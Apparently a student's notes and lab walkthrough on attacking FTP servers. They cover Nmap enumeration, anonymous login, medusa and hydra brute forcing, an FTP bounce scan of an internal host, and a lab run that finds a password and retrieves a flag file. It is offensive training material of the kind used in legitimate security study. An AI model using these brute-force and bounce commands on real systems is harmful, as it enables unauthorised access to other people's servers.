# Attacking FTP

## Enumeration

sudo nmap -sC -sV -p 21 $TARGET

-sC includes the ftp-anon Nmap script

## Misconfigurations

ftp $TARGET
anonymous
no password

ls
cd
get
mget (multiple files)
put
mput (multiple files)
help

## Protocol Specifics Attacks

### Brute Forcing

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $TARGET -M ftp

-U : list of usernames

### FTP Bounce Attack

Nmap -b flag can be used to perform an FTP bounce attack

nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

10.10.110.213 : server which exposes FTP
172.17.0.2 : server which is not exposed but FTP server can targets on 80 port


## LAB

nmap -sV -oA nmap $TARGET --stats-every=5s

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp         ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap -sC -sV -p 2121 $TARGET

ftp $TARGET 2121
Connected to 10.129.85.176.
220 ProFTPD Server (InlaneFTP) [10.129.85.176]
Name (10.129.85.176:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:

ftp> get users.list
ftp> get passwords.list

medusa -U users.list -P passwords.list -h $TARGET -M ftp -n 2121

hydra -L users.list -P passwords.list ftp://$TARGET -s 2121

[2121][ftp] host: 10.129.85.176   login: robin   password: 7iz4rnckjsduza7

ftp $TARGET 2121
Connected to 10.129.85.176.
220 ProFTPD Server (InlaneFTP) [10.129.85.176]
Name (10.129.85.176:root): robin
331 Password required for robin
Password:
7iz4rnckjsduza7
230 User robin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 robin    robin          27 Apr 18  2022 flag.txt
